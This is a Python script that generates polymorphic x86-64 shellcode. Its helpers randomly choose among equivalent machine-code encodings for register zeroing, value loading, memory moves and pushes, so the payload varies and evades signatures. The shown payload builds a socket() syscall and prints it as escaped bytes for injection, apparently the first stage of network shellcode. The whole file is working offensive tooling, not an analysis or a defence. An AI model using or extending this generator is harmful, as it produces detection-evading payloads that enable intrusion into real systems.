#!/usr/bin/python3
import struct
import random


def setRegToZero(reg):
    chunk = bytearray()
    case = random.randint(1,3)

    match case:
        case 1: # Xor with itself method
            xor = bytearray([0x48,0x31,(0xC0+(registerDictionary[reg]*9))])
            chunk += xor
        case 2: # Double shift right 32 method
            
            shift = bytearray([0x48,0xC1,(0xE8+registerDictionary[reg]),0x20])
            chunk += shift
            chunk += shift
        case 3: # push -1, pop and not 
            chunk.append(0x68)
            value = bytearray(struct.pack("<i",-1))
            for i in value :
                chunk.append(i)
            
            chunk.append((0x58+registerDictionary[reg]))

            not_op =  bytearray([0x48,0xf7,(0xD0+registerDictionary[reg])])
            chunk += not_op
            



    
    return chunk


def movValueToReg(reg,value):
    chunk = bytearray()
    case = random.randint(1,2)
    
    match case:
        case 1: # The push, pop, neg method
            
            chunk.append(0x68)
            value = -value
            value = bytearray(struct.pack("<i",value))
            for i in value :
                chunk.append(i)
            
            chunk.append((0x58+registerDictionary[reg]))

            neg = bytearray([0x48,0xf7,(0xD8+registerDictionary[reg])])

            chunk += neg

        case 2:
            chunk.append(0x68)
            value = -value
            value = bytearray(struct.pack("<i",value))
            for i in value :
                chunk.append(i)
            
            chunk.append((0x58+registerDictionary[reg]))

            not_op =  bytearray([0x48,0xf7,(0xD0+registerDictionary[reg])])
            chunk += not_op
            inc_ope = bytearray([0x48,0xff,(0xC0+registerDictionary[reg])])
            chunk += inc_ope
            

    
    
    return chunk

def movWORDToMemory(offset,reg):
    chunk = bytearray()
    case = random.randint(1,1)

    match case:
        case 1: #mov to address method
            mov = bytearray([0x66,0x89, (0x04+(registerDictionary[reg]*8)),0x24])
            if offset != 0:
                mov[2] += 0x40
                mov.append(offset)
            chunk += mov


    return chunk

def movDWORDToMemory(offset,reg):
    chunk = bytearray()
    case = random.randint(1,1)

    match case:
        case 1: #mov to address method
            mov = bytearray([0x89, (0x04+(registerDictionary[reg]*8)),0x24])
            if offset != 0:
                mov[1] += 0x40
                mov.append(offset)
            chunk += mov


    return chunk

def movQWORDToMemory(offset,reg):
    chunk = bytearray()
    case = random.randint(1,1)

    match case:
        case 1: #mov to address method
            mov = bytearray([0x48,0x89, (0x04+(registerDictionary[reg]*8)),0x24])
            if offset != 0:
                mov[2] += 0x40
                mov.append(offset)
            chunk += mov


    return chunk

def movBYTEToMemory(offset,reg):
    chunk = bytearray()
    case = random.randint(1,1)

    match case:
        case 1: #mov to address method
            mov = bytearray([0x88, (0x04+(registerDictionary[reg]*8)),0x24])
            if offset != 0:
                mov[1] += 0x40
                mov.append(offset)
            chunk += mov


    return chunk

def pushWORDToStack(reg):
    chunk = bytearray()
    case = random.randint(1,1)

    match case:
        case 1: #push to stack method
            push = bytearray([0x66,0x50+(registerDictionary[reg])])
            chunk += push

    return chunk

def pushDWORDToStack(reg):
    chunk = bytearray()
    case = random.randint(1,1)

    match case:
        case 1: #push to stack method
            push = bytearray([0x50+(registerDictionary[reg])])
            chunk += push

    return chunk





registerDictionary = {"rax":0,"rcx":1,"rdx":2,"rbx":3,"rsp":4,"rbp":5,"rsi":6,"rdi":7}
# the order works for : push FB, pop FB
syscall = bytearray([0x0f,0x05])
shellcode = bytearray()

shellcode += movValueToReg("rdi",2)
shellcode += movValueToReg("rsi",1)
shellcode += setRegToZero("rdx")
shellcode += movValueToReg("rax",41)
shellcode += syscall





for i in shellcode:
    if i < 16:
        print("\\x0{}".format(hex(i).lstrip("0x")),end='')
    else:
        print("\\x{}".format(hex(i).lstrip("0x")),end='')



